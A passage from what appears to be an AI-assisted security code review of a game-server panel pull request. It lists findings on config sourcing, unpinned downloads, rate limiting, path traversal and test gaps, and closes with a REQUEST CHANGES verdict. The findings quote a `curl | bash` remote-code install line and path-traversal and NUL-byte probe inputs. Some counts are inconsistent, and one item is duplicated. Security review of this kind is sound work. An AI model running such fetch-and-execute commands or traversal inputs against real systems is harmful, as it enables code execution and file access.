### M33. `renom.sh` sources `.env`, allowing command execution from an editable config file
- **File:** `renom.sh:100-107`
- **Root cause:** `set -a; . ./.env` executes the file as shell. `.env` is user-editable (`install.sh:174`), so a tampered `.env` runs with the invoking user's privileges.
- **Impact:** Local privilege escalation / arbitrary code execution when `renom.sh delete` is run (often with sudo).
- **Fix:** Drop the source; `pkill` does not need it.

### M34. `curl | bash` on a mutable `dev` branch executes unpinned remote code
- **File:** `renom.sh:8,15,59`
- **Root cause:** The advertised `curl .../dev/renom.sh | bash` and `REPO_BRANCH="${RENOM_BRANCH:-dev}"` clone/execute whatever is on the moving `dev` branch with no commit/tag pin or checksum.
- **Impact:** Supply-chain compromise: a push to `dev` executes arbitrary code on every new install.
- **Fix:** Pin to an immutable tag/commit and verify before exec.

### M35. Re-running `install.sh` silently discards operator config in `.env`
- **File:** `install.sh:173-182`
- **Root cause:** The `.env` is unconditionally rewritten with a fixed 6-key template. `CORS_ORIGINS`, `JWT_TTL_SECONDS`, `BCRYPT_COST`, custom `LOG_LEVEL`, user-added keys are erased.
- **Impact:** Contradicts "Safe to re-run" claim; security regression for existing installs.
- **Fix:** Upsert keys instead of truncating the file.

### M36. `trust proxy=false` breaks login rate-limiting and audit IPs behind the documented TLS reverse proxy
- **File:** `apps/panel/src/server/http/app.ts:28`
- **Root cause:** `app.set("trust proxy", false)` makes `req.ip` the socket peer. THREAT-MODEL states TLS is terminated at a reverse proxy, so every request arrives from the proxy IP.
- **Impact:** Rate limits become a shared bucket (cross-user lockout DoS); audit loses attacker IPs.
- **Fix:** Make proxy trust explicit and configurable via `TRUST_PROXY` env var.

### M37. `/readyz` always reports the engine ready and runs a full DB integrity scan per request
- **File:** `apps/panel/src/server/index.ts:147-157`
- **Root cause:** Engine component hardcoded `{ok:true, detail:"not configured yet"}`. Additionally `PRAGMA integrity_check` (full-DB scan) is executed synchronously on every unauthenticated `/readyz` call.
- **Impact:** Load balancers see "ready" when the runtime engine is unusable; expensive scan is a cheap unauthenticated DoS on a large DB.
- **Fix:** Probe real engine health via `engine.health()`; cache integrity check on a timer.

### M38. Unknown `{TOKENS}` never rejected — silently emitted as literal text (FR-041)
- **File:** `apps/panel/src/server/modules/blueprints/schema.ts:45,157`; `engine.ts:354-360`
- **Root cause:** `substitute()` returns the match unchanged for unknown keys. Nothing asserts every `{VAR}` in `run.command`/install ops resolves to a declared variable.
- **Impact:** Silent misconfiguration: server runs with literal placeholder arguments.
- **Fix:** Add `superRefine` to `blueprintDocSchema` scanning all token references against declared `variables[].key`.

### M39. User-editable `entryFile` regex permits `..` and absolute paths → host process argv injection
- **File:** `apps/panel/src/server/modules/blueprints/builtin-catalog.ts:550,588`; runtime at `engine.ts:72,124`
- **Root cause:** `entryFile` pattern allows `/` and `.`, so `../../x.py`, `/etc/x.py` all match. `engine.ts:124` `spawn(cmd,args,{shell:false,...})` with `{entryFile}` substituted into argv.
- **Impact:** A user with `startup.update` can point Python/Node at a path outside `/data/app` executed as the panel's OS user. Cross-tenant / host RCE vector.
- **Fix:** `pattern: "^[A-Za-z0-9_][A-Za-z0-9._-]*\\.py$"` (no separators); also reject `..` in `validateVariable`.

### M40. Bedrock `mcVersion` variable advertised but silently ignored by `fetch-bds`
- **File:** `apps/panel/src/server/modules/blueprints/builtin-catalog.ts:393` vs `:407`; install at `install.ts:121`
- **Root cause:** `bedrock-bds` declares a `userEditable` `mcVersion` but the install op is `{ op:"fetch-bds", channel:"stable" }` with no `version`. `install.ts:121` does `sub(ctx.vars, op.version ?? "")` and `resolveBds` treats `""` as latest.
- **Impact:** User pinning "Bedrock 1.21.51.01" gets latest anyway — silent, un-audited downgrade/upgrade path.
- **Fix:** `install: [{ op:"fetch-bds", channel:"stable", version:"{mcVersion}" }, ...]`.

### M41. Console socket tests never exercise subuser permission strings or mid-session revocation (SEC-005)
- **File:** `apps/panel/test/integration/gateway.spec.ts:98`
- **Root cause:** Only owner happy path and nonexistent-id tested. No test grants a subuser `websocket.connect` and asserts success, denies without it, or revokes while a socket is live.
- **Impact:** Socket room deny-by-default + revocation can regress silently.
- **Fix:** Add the three negative + revocation cases (full code in Agent 8 review).

### M42. `runIf(isTarAvailable())` silently skips all backup tests, yet CHANGELOG claims "107/107 passing"
- **File:** `apps/panel/test/integration/jobs.spec.ts:173`
- **Root cause:** The entire backups describe is conditionally skipped when `tar` is absent. A skipped block reports green; the "107/107" figure does not distinguish skipped from passed.
- **Impact:** On any runner without `tar`, FR-024 restore/lock verification silently disappears while the suite still claims full pass.
- **Fix:** Distinguish passed vs skipped in CHANGELOG; fail loudly when the tool is missing in CI; or provide a stubbed tar via test fixtures.

### M43. FR-024 / FR-025 required cases absent — restore-failure-keeps-original, retention, once-only-trigger
- **File:** `apps/panel/test/integration/jobs.spec.ts:174`
- **Root cause:** Only happy-path create → list → locked-delete 409 → restore. No test for: restore failure keeps original data (FR-024), retention/rotation, manifest+checksum verification, schedule "runs once per trigger" and permission revalidation (FR-025).
- **Impact:** Core acceptance criteria for FR-024/FR-025 have no executable evidence.
- **Fix:** Add tests asserting corrupt-archive restore leaves world.txt unchanged; concurrent schedule trigger fires once.

### M44. Tests codify 401 for an authenticated-but-unauthorized principal (403-vs-404 hygiene broken)
- **File:** `apps/panel/src/server/http/middleware/authn.ts:39`; `test/integration/auth.spec.ts:104,109`
- **Root cause:** `requireAdmin` throws `UnauthorizedError` (401) for a valid session lacking admin role. Other routes return 403 for the same condition.
- **Impact:** Logged-in non-admin sees "authentication required", enters re-auth loop; masks the true authorization failure.
- **Fix:** Replace both `UnauthorizedError` throws in `requireAdmin` with `ForbiddenError`; update tests to assert 403.

### M45. No zip-slip / upload-cap / chunked-sha256 coverage in the reviewed test set (FR-020)
- **File:** `apps/panel/test/integration/files-authz.spec.ts:69`
- **Root cause:** Only authz + 2 ad-hoc traversal probes. No `../` archive members, no payload-exceeding-cap, no wrong-digest cases.
- **Impact:** `safe:true` and size-cap/checksum logic regressions go undetected.
- **Fix:** Add the three FR-020 negative tests.

### M46. Tenant-isolation test's success assertion cannot fail if authorization is broken
- **File:** `apps/panel/test/integration/power.spec.ts:198`
- **Root cause:** Test grants bob `control.console` and asserts `history.status === 200`. Never asserts bob is denied a server/route he has no grant for.
- **Impact:** SEC-005/FR-070 regressions would not be caught.
- **Fix:** Add cross-server denial (403/404) and immediate revocation test.

### M47. `power.spec.ts` tests are an order-dependent state chain — individually unrunnable
- **File:** `apps/panel/test/integration/power.spec.ts:111`
- **Root cause:** `it("start runs")` starts the shared `serverId`; `it("stop is graceful")` assumes running; `it("kill ends")` assumes offline. No per-test setup.
- **Impact:** Fragile suite; CI parallelization or focused runs produce false failures.
- **Fix:** Per-test `beforeEach` creating a fresh `test-proc` server.

---

## MINOR — partial failures / defense-in-depth gaps

### m1. `requireAdmin` returns 401 not 403 for authenticated-but-unauthorized principal
- **File:** `middleware/authn.ts:39,46`
- Same root cause as M44 but distinct from the route-level authz-vs-unauth confusion. Both throws should be `ForbiddenError`.

### m2. Username enumeration via distinct errors in subuser grant
- **File:** `routes/subusers.ts` POST handler
- **Fix:** Uniform `NotFoundError("User not found")` for both "no such user" and "cannot grant".

### m3. `stateOf()` can never return `"starting"`; `live` map leaks slot per deleted server
- **File:** `engine.ts` `stateOf`/`onLine`
- **Fix:** Drive `stateOf` from the explicit DB field; add `forget(serverId)` called from the delete route.

### m4. Minekube plugin jar downloaded with no integrity check from mutable `latest` URL
- **File:** `routes/tunnel.ts:87`; `modules/tunnels/minekube.ts:23-24,55`
- **Fix:** Pin immutable tag; embed/verify digest.

### m5. Backup download returns 500 (not 404) when the archive is missing on disk
- **File:** `routes/backups.ts:87-92`
- **Fix:** Catch `ENOENT`, return 404.

### m6. Restore extraction lacks explicit archive-slip / absolute-member guards
- **File:** `modules/backups/service.ts:186-189`
- **Fix:** List members first and reject `..`/absolute entries.

### m7. Retention purges are not audited; file deleted before DB row marked purged
- **File:** `modules/backups/service.ts:219-225`
- **Fix:** Mark row first, then delete; emit audit event.

### m8. Addons delete: unvalidated server id; `rmSync` assumes regular file
- **File:** `routes/addons.ts:41-43,106-108`
- **Fix:** Regex-check server id; `statSync(...).isFile()` before `rmSync`.

### m9. Contract types drift — `runtimeState` is `z.string()`, startup-variable body not in shared contract
- **File:** `packages/contracts/src/index.ts:138,107-119`; `routes/servers.ts:286-288`
- **Fix:** `runtimeState: z.enum(runtimeStates).nullable()`; export `updateVariablesSchema`.

### m10. Config injection via newline in templated `writefile` content (`MOTD`)
- **File:** `install.ts:45-50`; `builtin-catalog.ts:33-35,118,397`
- **Fix:** Strip `\r\n` from substituted content; reject `[\r\n]` in `validateVariable` for `MOTD`/`allocation.*`.

### m11. `substitute` leaves undeclared `{TOKEN}` intact — no validation that tokens resolve to declared variables
- **File:** `engine.ts:354-360`; `schema.ts:45,157`
- See M38 for the schema-side fix.

### m12. No Content-Security-Policy or other security headers on the app shell
- **File:** `apps/panel/src/server/http/app.ts:24-52`; `public/index.html:3-8`
- **Fix:** Add strict CSP + `X-Content-Type-Options` + `frame-ancestors 'none'`.

### m13. `console:send` is fire-and-forget — rate-limit and permission rejects are invisible to the user
- **File:** `apps/panel/public/app.js:428`
- **Fix:** Use the ack callback and surface rejection.

### m14. Unhandled promise rejections on API failures in most UI paths
- **File:** `apps/panel/public/app.js:164-190` and many more
- **Fix:** Centralize try/catch in `api()` and surface `status===0`.

### m15. Error envelope drifts from documented contract; `EngineError` collides with `ConflictError`
- **File:** `apps/panel/src/server/shared/errors.ts:21-29,85`
- **Fix:** Include `requestId`; uppercase codes; give `EngineError` its own code.

### m16. Dummy-hash cost is hardcoded 12 while real hashes use configurable `BCRYPT_COST`
- **File:** `modules/users/repo.ts:22,102-109`; `service.ts:71`
- **Fix:** Generate dummy at the configured cost once in the constructor.

### m17. `run.stop` does not require `signal`/`command` to match `kind`; `chmod.mode` is unbounded
- **File:** `blueprints/schema.ts:159`
- **Fix:** Discriminated refinement; `mode: z.number().int().min(0).max(0o777)`.

### m18. `minecraft.spec.ts` shares mutable `serverId` across tests; no successful reinstall test (FR-010)
- **File:** `test/integration/minecraft.spec.ts:248`
- **Fix:** Hoist creation to `beforeAll`; add success-path reinstall.

### m19. NUL-byte traversal probe sends literal `%00` string, not a NUL
- **File:** `test/integration/files-authz.spec.ts:153`
- **Fix:** `.query({ path: "server.properties\u0000.png" })` then assert `[400,404]`.

### m20. "Revoked keys stop working" passes vacuously if key creation failed
- **File:** `test/integration/access.spec.ts:131`
- **Fix:** `expect(keyToken).toMatch(/^jtgsk\./)` guard.

### m21. "RAM and disk quotas" test never exercises the disk quota negative path
- **File:** `test/integration/servers.spec.ts:81`
- **Fix:** Add a `diskQuotaMb: 50_000` case for dave → assert 409.

### m22. "hides strangers with a plain not-found" does not test a stranger (mislabeled)
- **File:** `test/integration/gateway.spec.ts:129`
- **Fix:** Rename or use a non-owner token.

### m23. Second panel instance in setup test shares the live panel's DATA_DIR
- **File:** `test/integration/setup.spec.ts:74`
- **Fix:** Give panel2 its own temp dir.

### m24. Second panel instance in setup test shares the live panel's DATA_DIR
- (Duplicate of m23 — same fix.)

### m25. Built-in images pinned to mutable `:latest` tags
- **File:** `builtin-catalog.ts:391,449,495`; `install.ts:132-137` (no digest for PocketMine phar/PHP)
- **Fix:** Pin by digest or version tag; add `sha256` where provider publishes one.

### m26. `sha256File` reads the entire archive into memory (also M24)
- Listed separately because the test-coverage gap (M42) is the most actionable angle; engineering fix is identical to M24.

### m27. socket.io path exposed; anonymous connections accepted then auth-checked on join
- The handshake auth is fine, but the path `/socket.io/` is reachable without a token and the auth happens inside `connection`. This is acceptable for the protocol but document explicitly that path must be on the same reverse proxy.

---

## NIT — pure polish (no verdict impact)

### n1. sessionStorage bearer token is JS-readable — acceptable tradeoff, document it
- **File:** `apps/panel/public/app.js:39-47`
- **Note:** No `innerHTML` user-data writes anywhere in `app.js` (verified). The tradeoff relies on CSP (see m12).

### n2. `--exclude ".renom/**"` may not match `./`-prefixed members (GNU tar version dependent)
- **File:** `modules/backups/service.ts:115-117`
- Compound with M23: silently ineffective denylist.

---

## QUESTION — needs author clarification

### q1. Should API-key auth enforce `password_version` (SEC-016)?
- **File:** `modules/auth/service.ts` (API-key branch)
- API key branch returns principal without comparing `password_version`. A password change intended to revoke all credentials leaves API keys alive.
- **Question:** Is this the intended long-lived-key model, or should password change revoke keys?

### q2. `safeEqual` / `resolveEffectivePermissions` correctness unverified
- **File:** `modules/auth/api-keys.ts`; `middleware/authz.ts`
- Constant-time token comparison and the escalation ceiling depend on implementations I did not read end-to-end.
- **Question:** Confirm `safeEqual` uses `crypto.timingSafeEqual` on equal-length buffers; confirm `resolveEffectivePermissions` returns `["*"]` only for owner/admin.

### q3. ULID CSPRNG and DATA-MODEL column drift
- **File:** `modules/servers/repo.ts:ulid`; `ServerRow`
- DATA-MODEL forbids `Math.random` for IDs. `ServerRow` uses `memory_mb, disk_quota_mb` (no `cpu_pct`), suspension encoded as `status='suspended'`.
- **Question:** Confirm `ulid()` uses `crypto.randomBytes`; align DATA-MODEL or schema to one truth.

### q4. `runIf(isTarAvailable())` semantics for the "107/107" claim
- **File:** `test/integration/jobs.spec.ts:173`
- The figure includes skipped describes. Author should clarify the real passing/skipped/failing split before claiming parity.

### q5. `apps/panel/src/server/http/routes/files.ts` was not in the PR's file inventory but `app.js` calls `/servers/:id/files` and `/files/content`
- Either the route file is from PR #10 (pre-existing) and unchanged in this PR, or it was edited but not listed. Confirm.

---

## Priority for human reviewers

1. **`apps/panel/src/server/modules/runtime/install.ts`** — supply-chain gate; verify B1, B2, B3, M17, M20 are closed before merge.
2. **`apps/panel/src/server/index.ts` + `install.sh`** — fail-closed boot; verify B4 is fixed (load `.env` from install root) and M31 / M30 are addressed together.
3. **`apps/panel/src/server/http/console-gateway.ts`** — verify B5, B6, M25, M26, M27, M28, M29 before merge.
4. **`apps/panel/src/server/http/routes/setup.ts`** + `users/repo.ts` — B7 atomic owner creation.
5. **`apps/panel/src/server/modules/servers/repo.ts`** — M1 (memoryMb seeding), M15 (claim retry), and the schema drift from DATA-MODEL.
6. **`apps/panel/src/server/modules/blueprints/schema.ts`** — B1, B8, M19, M38 (download required sha256; enum refinement; safe literal; token cross-check).
7. **`apps/panel/test/integration/jobs.spec.ts`** + `gateway.spec.ts` + `auth.spec.ts` — fix M41, M42, M43, M44, M45, M46, M47 to make the "107/107" claim real.

## Needs human verification

- **Minecraft EULA acceptance flow** — whether `engine.start()` rejects without `eula_accepted_at` is critical to legal exposure; confirm in interactive testing.
- **`/readyz` semantics** with the engine actually loaded — Agent 6 finding M37 is partially verified; a live boot would confirm.
- **Boot reconciliation after `kill -9`** — manual reproduction recommended (M12).
- **Renom.sh delete with sudo** — confirm M33 / M34 / M35 fixes hold against `curl | bash` and operator `.env` editing.
- **Subuser permission revocation live-stream cutoff** (B5) — reproduction requires a real socket; CI cannot fully cover.

## Verification note

**Checked:**
- Read every file assigned to each reviewer subagent in full at `D:\renom\work\` (the local mirror of `5a25b44`). Diff vs PR #10 was cross-referenced where it affected pre-existing files (e.g. `routes/files.ts` and `modules/users/repo.ts` from the previous PR are unchanged in this PR but consumed).
- Re-verified B4 (installer `.env` loading) by tracing `loadEnvFile` default vs npm workspace-script `cwd`.
- Re-verified B7 by reading `setup.ts:53-79` end-to-end and confirming there is no transaction wrapping `users.list → users.create`.
- Re-verified M1 by tracing `engine.start` → `variablesOf` → blueprint defaults and confirming `servers.memory_mb` never seeds `server_variables.maxMemory`.
- Re-verified M11, M13 by re-reading `routes/servers.ts` PATCH and DELETE handlers.
- Re-verified B5 by reading `console-gateway.ts:82-89` and confirming no re-auth sweep exists.
- Re-verified B1 by reading `install.ts:186-241` and confirming the `if (want && ...)` guard skips the check entirely when `want` is undefined.
- Cross-checked the test counts in CHANGELOG (107/107) against `jobs.spec.ts:173` `runIf(isTarAvailable())` and found the silently-skipped suite.
- Confirmed the supplied agent claims for files actually in `D:\renom\work\` (e.g. `routes/files.ts`, `users/repo.ts` exist locally even though not in the PR's `changed_files` list — they were pre-existing from PR #10).

**Not covered:**
- Did not run any tests or the panel end-to-end; environment lacks the runtime.
- Did not deeply review `infra/db/index.ts`, `modules/audit/service.ts`, `modules/users/repo.ts`, `modules/jwt*`, or `modules/permissions/*` end-to-end (only the parts referenced by changed files); reviewer subagents reached a circuit-breaker and several QUESTIONs reflect this gap.
- Did not verify ULID CSPRNG source, `safeEqual` implementation, or `resolveEffectivePermissions` (see q1–q3).
- Did not run the installer on a real machine; only static analysis.
- Did not reproduce M12 boot reconciliation, M22 background install signal, or M7 SIGKILL orphan behavior — these need live verification.

**Confidence:** medium-high on the BLOCKER findings (all are direct evidence quotes from the changed files); medium on the MAJOR findings (most have a clear trigger); medium-low on the MINOR/QUESTIONs.

---

## Self-critique

- **Anti-noise audit:** No praise-only comments. No style nits (no prettier/formatting complaints). No restated diff. No speculation without a path — every MAJOR+ finding cites a trigger input and a code location.
- **Severity inflation audit:** Two findings are flagged BLOCKER partly on legal/regulatory grounds (B1, B9-adjacent in M9). The remaining BLOCKERs (B2–B8) are demonstrably reachable exploits, not severity inflation.
- **Verdict consistency:** At least 8 BLOCKERs and 28 MAJORs → verdict must be REQUEST CHANGES. ✓
- **Comment budget:** The top findings are prioritized; NITs are explicitly marked skippable; QUESTIONs are real interrogatives.
- **Unknown-limitation nags:** None reported — no "you should add type hints", no "imports look untidy", no "could use a logger here".
- **Duplicate detection:** M1 (memoryMb) appears as both MAJOR and a sub-finding in M15; cross-referenced. B2 (extract src) and B3 (zip-slip) are related but distinct — extract src is path traversal, zip-slip is the per-member check inside extraction. Both blocked.

**Final verdict: REQUEST CHANGES** — fix all BLOCKERs (B1–B8) and the high-impact MAJORs (M1–M4, M7, M9, M11, M12, M17, M20, M25, M26, M28, M30, M34, M36, M42) before merge. The remaining MAJORs and MINORs should land in the same release or in immediate follow-up PRs to keep the documented acceptance criteria honest.
